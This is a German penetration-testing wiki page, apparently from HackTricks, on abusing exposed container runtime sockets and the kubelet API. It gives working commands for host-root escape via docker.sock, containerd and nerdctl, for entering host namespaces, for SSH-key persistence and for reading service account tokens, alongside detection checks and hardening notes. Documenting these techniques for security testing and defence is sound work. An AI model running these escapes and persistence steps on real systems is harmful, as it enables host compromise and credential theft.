# Runtime-API und Daemon-Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Viele reale Container-Kompromittierungen beginnen überhaupt nicht mit einem Namespace-Escape. Sie beginnen mit Zugriff auf die Runtime-Control-Plane. Wenn ein Workload über einen gemounteten Unix-Socket oder einen exponierten TCP-Listener mit `dockerd`, `containerd`, CRI-O, Podman oder kubelet kommunizieren kann, kann der Angreifer möglicherweise einen neuen Container mit erweiterten Privilegien anfordern, das Host-Dateisystem mounten, Host-Namespaces beitreten oder sensible Node-Informationen abrufen. In diesen Fällen ist die Runtime-API die tatsächliche Sicherheitsgrenze, und ihre Kompromittierung kommt funktional einer Kompromittierung des Hosts nahe.

Aus diesem Grund sollte die Exposure von Runtime-Sockets getrennt von Kernel-Schutzmechanismen dokumentiert werden. Ein Container mit gewöhnlichem seccomp, Capabilities und MAC-Confinement kann dennoch nur einen API-Aufruf von einer Host-Kompromittierung entfernt sein, wenn `/var/run/docker.sock` oder `/run/containerd/containerd.sock` in ihn gemountet ist. Die Kernel-Isolation des aktuellen Containers kann genau wie vorgesehen funktionieren, während die Runtime-Management-Plane weiterhin vollständig exponiert ist.

## Daemon-Zugriffsmodelle

Docker Engine stellt seine privilegierte API traditionell über den lokalen Unix-Socket unter `unix:///var/run/docker.sock` bereit. Historisch wurde sie auch remote über TCP-Listener wie `tcp://0.0.0.0:2375` oder einen TLS-geschützten Listener auf `2376` exponiert. Wird der Daemon remote ohne starkes TLS und Client-Authentifizierung exponiert, wird die Docker-API effektiv zu einer Remote-Root-Schnittstelle.

containerd, CRI-O, Podman und kubelet exponieren ähnliche hochkritische Angriffsflächen. Die Namen und Workflows unterscheiden sich, die Logik jedoch nicht. Wenn die Schnittstelle dem Aufrufer erlaubt, Workloads zu erstellen, Host-Pfade zu mounten, Credentials abzurufen oder laufende Container zu verändern, handelt es sich um einen privilegierten Management-Kanal, der entsprechend behandelt werden sollte.

Häufige lokale Pfade, die überprüft werden sollten, sind:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Ältere oder stärker spezialisierte Stacks können außerdem Endpoints wie `dockershim.sock`, `frakti.sock` oder `rktlet.sock` bereitstellen. Diese sind in modernen Umgebungen weniger verbreitet, sollten bei ihrem Auftreten jedoch mit derselben Vorsicht behandelt werden, da sie Runtime-Kontrollflächen und keine gewöhnlichen Anwendungssockets darstellen.

## Sicherer Remote-Zugriff

Wenn ein Daemon über den lokalen Socket hinaus zugänglich gemacht werden muss, sollte die Verbindung mit TLS geschützt werden, vorzugsweise mit gegenseitiger Authentifizierung, sodass der Daemon den Client und der Client den Daemon verifiziert. Die alte Gewohnheit, den Docker-Daemon aus Bequemlichkeit über einfaches HTTP zu öffnen, ist einer der gefährlichsten Fehler bei der Container-Administration, da die API-Oberfläche stark genug ist, um direkt privilegierte Container zu erstellen.

Das historische Docker-Konfigurationsmuster sah folgendermaßen aus:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Auf systemd-basierten Hosts kann die Kommunikation mit dem Daemon auch als `fd://` erscheinen. Das bedeutet, dass der Prozess einen von systemd vorab geöffneten Socket übernimmt, anstatt ihn selbst direkt zu binden. Die wichtige Erkenntnis betrifft nicht die genaue Syntax, sondern die Sicherheitsauswirkung. Sobald der Daemon über einen streng berechtigten lokalen Socket hinaus lauscht, werden Transportsicherheit und Client-Authentifizierung zwingend erforderlich und sind keine optionale Härtung mehr.

## Abuse

Wenn ein Runtime-Socket vorhanden ist, prüfe, um welchen Socket es sich handelt, ob ein kompatibler Client existiert und ob der Zugriff über rohes HTTP oder gRPC möglich ist:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Diese Befehle sind nützlich, weil sie zwischen einem nicht erreichbaren Pfad, einem eingebundenen, aber nicht zugänglichen Socket und einer aktiven privilegierten API unterscheiden. Wenn der Client erfolgreich ist, stellt sich als Nächstes die Frage, ob die API einen neuen Container mit einem host bind mount oder gemeinsam genutzten host namespace starten kann.

### Wenn kein Client installiert ist

Das Fehlen von `docker`, `podman` oder einer anderen benutzerfreundlichen CLI bedeutet nicht, dass der Socket sicher ist. Docker Engine spricht über seinen Unix-Socket HTTP, und Podman stellt über `podman system service` sowohl eine Docker-compatible API als auch eine Libpod-native API bereit. Das bedeutet, dass eine minimale Umgebung, in der nur `curl` vorhanden ist, möglicherweise trotzdem ausreicht, um den daemon zu steuern:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Dies ist während der post-exploitation relevant, da Verteidiger manchmal die üblichen Client-Binaries entfernen, aber den Management-Socket eingebunden lassen. Auf Podman-Hosts gilt: Der wertvolle Pfad unterscheidet sich zwischen rootful- und rootless-Deployments: `unix:///run/podman/podman.sock` für rootful-Service-Instanzen und `unix://$XDG_RUNTIME_DIR/podman/podman.sock` für rootless-Instanzen.

### Vollständiges Beispiel: Docker-Socket zu Host-Root

Wenn `docker.sock` erreichbar ist, besteht der klassische Escape darin, einen neuen Container zu starten, der das Root-Dateisystem des Hosts einbindet, und anschließend mit `chroot` dorthin zu wechseln:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Dies ermöglicht eine direkte Ausführung mit Host-root-Rechten über den Docker-Daemon. Die Auswirkungen beschränken sich nicht auf das Lesen von Dateien. Sobald sich der Angreifer im neuen Container befindet, kann er Host-Dateien verändern, Credentials abgreifen, Persistence implantieren oder zusätzliche privilegierte Workloads starten.

### Vollständiges Beispiel: Docker Socket zu Host-Namespaces

Wenn der Angreifer den Namespace-Eintritt anstelle des reinen Dateisystemzugriffs bevorzugt:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Dieser Pfad erreicht den Host, indem die Runtime angewiesen wird, einen neuen Container mit expliziter Freigabe des Host-Namespace-Zugriffs zu erstellen, statt die aktuelle Umgebung auszunutzen.

### Docker Socket Persistence Pattern

Runtime-Steuerung kann auch für Persistence statt für eine einmalige Shell verwendet werden. Das generische Muster besteht darin, einen Hilfscontainer mit einem Host-Mount zu erstellen, autorisierte Zugangsdaten oder einen Startup-Hook in das eingehängte Host-Dateisystem zu schreiben und anschließend zu prüfen, ob der Host diese verwendet.

Beispielstruktur:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Dieselbe Idee kann je nach dem, was der Operator nachweisen möchte, auf systemd units, cron fragments, application startup files oder SSH keys abzielen. Entscheidend ist, dass die persistente Änderung über die host-level filesystem authority des runtime daemon vorgenommen wird und nicht durch zusätzliche Privilegien im ursprünglichen Container.

### Raw Docker API Helper Pivot

Wenn die Docker CLI fehlt, kann derselbe host-mount helper flow über HTTP über den Unix socket ausgeführt werden. Der allgemeine Ablauf lautet: die API bestätigen, einen helper container mit einem host bind mount erstellen, ihn starten, eine exec instance erstellen und diese exec instance starten.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Die abschließende Anfrage an `/exec/<id>/start` hängt von der zurückgegebenen Exec-ID ab, aber der sicherheitsrelevante Punkt ist unabhängig von der genauen JSON-Verarbeitung: Der direkte Zugriff auf die API eines rootful Docker-Daemons reicht aus, um eine privilegiertere Hilfs-Workload anzufordern.

### Vollständiges Beispiel: containerd-Socket

Ein eingebundener `containerd`-Socket ist normalerweise ebenso gefährlich:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Ist ein stärker an Docker angelehnter Client verfügbar, kann `nerdctl` praktischer als `ctr` sein, da es vertraute Flags wie `--privileged`, `--pid=host` und `-v` bereitstellt:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Die Auswirkung ist erneut eine Kompromittierung des Hosts. Selbst wenn Docker-spezifische Tools fehlen, kann eine andere Runtime-API weiterhin dieselben administrativen Möglichkeiten bieten. Auf Kubernetes-Nodes kann `crictl` ebenfalls für Reconnaissance und die Interaktion mit Containern ausreichen, da es direkt mit dem CRI-Endpunkt kommuniziert.

### BuildKit Socket

`buildkitd` wird leicht übersehen, da viele es als „nur das Build-Backend“ betrachten. Der Daemon ist jedoch weiterhin eine privilegierte Steuerungsebene. Ein erreichbarer `buildkitd.sock` kann es einem Angreifer ermöglichen, beliebige Build-Schritte auszuführen, die Fähigkeiten des Workers zu untersuchen, lokale Kontexte aus der kompromittierten Umgebung zu verwenden und gefährliche Entitlements wie `network.host` oder `security.insecure` anzufordern, wenn der Daemon so konfiguriert wurde, dass er diese zulässt.

Nützliche erste Interaktionen sind:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Wenn der Daemon Build-Anfragen akzeptiert, prüfe, ob unsichere Entitlements verfügbar sind:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Die genauen Auswirkungen hängen von der Daemon-Konfiguration ab, aber ein rootful BuildKit-Service mit permissive entitlements ist keine harmlose Entwicklerbequemlichkeit. Behandle ihn als weitere hochwertige administrative Angriffsfläche, insbesondere auf CI runnern und gemeinsam genutzten Build-Nodes.

### Kubelet-API über TCP

Der kubelet ist kein Container-Runtime, gehört aber weiterhin zur Node-Management-Ebene und wird häufig in derselben Vertrauensgrenzen-Diskussion berücksichtigt. Wenn der sichere Port des kubelet, `10250`, aus dem Workload erreichbar ist oder Node-Credentials, kubeconfigs oder Proxy-Rechte offengelegt sind, kann der Angreifer möglicherweise Pods enumerieren, Logs abrufen oder Befehle in Node-lokalen Containern ausführen, ohne jemals den Admission-Pfad des Kubernetes-API-Servers zu berühren.

Beginne mit kostengünstiger Erkundung:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Wenn der kubelet- oder API-Server-Proxy-Pfad `exec` autorisiert, kann ein WebSocket-fähiger Client dies in eine Codeausführung in anderen Containern auf dem Node umwandeln. Deshalb ist `nodes/proxy` mit lediglich der Berechtigung `get` gefährlicher, als es klingt: Die Anfrage kann weiterhin kubelet-Endpunkte erreichen, die Befehle ausführen, und diese direkten kubelet-Interaktionen erscheinen nicht in den normalen Kubernetes-Audit-Logs.

## Prüfungen

Das Ziel dieser Prüfungen ist festzustellen, ob der Container eine Management-Ebene erreichen kann, die außerhalb der Vertrauensgrenze hätte bleiben sollen.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Was ist hier interessant:

- Ein gemounteter Runtime-Socket ist normalerweise ein direktes administratives Primitiv und nicht lediglich eine Offenlegung von Informationen.
- Ein TCP-Listener auf `2375` ohne TLS sollte als Bedingung für eine Remote-Kompromittierung behandelt werden.
- Umgebungsvariablen wie `DOCKER_HOST` zeigen oft, dass der Workload absichtlich für die Kommunikation mit der Host-Runtime konzipiert wurde.

## Runtime-Standardeinstellungen

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächung |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig lokaler Unix-Socket | `dockerd` lauscht am lokalen Socket und der Daemon läuft normalerweise rootful | Mounten von `/var/run/docker.sock`, Freigabe von `tcp://...:2375`, schwaches oder fehlendes TLS auf `2376` |
| Podman | Standardmäßig daemonlose CLI | Für die normale lokale Nutzung ist kein dauerhaft laufender privilegierter Daemon erforderlich; API-Sockets können jedoch weiterhin freigegeben werden, wenn `podman system service` aktiviert ist | Freigabe von `podman.sock`, weitreichendes Ausführen des Services, rootful API-Nutzung |
| containerd | Lokaler privilegierter Socket | Die administrative API wird über den lokalen Socket bereitgestellt und normalerweise von übergeordneten Tools verwendet | Mounten von `containerd.sock`, weitreichender `ctr`- oder `nerdctl`-Zugriff, Freigabe privilegierter Namespaces |
| CRI-O | Lokaler privilegierter Socket | Der CRI-Endpunkt ist für vertrauenswürdige, auf dem Node laufende Komponenten vorgesehen | Mounten von `crio.sock`, Freigabe des CRI-Endpunkts für nicht vertrauenswürdige Workloads |
| Kubernetes kubelet | Node-lokale Management-API | Kubelet sollte aus Pods nicht weitreichend erreichbar sein; der Zugriff kann je nach Authentifizierung und Autorisierung Pod-Status, Credentials und Funktionen zur Ausführung offenlegen | Mounten von kubelet-Sockets oder -Zertifikaten, schwache kubelet-Authentifizierung, Host-Networking plus erreichbarer kubelet-Endpunkt |

## Quellen

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
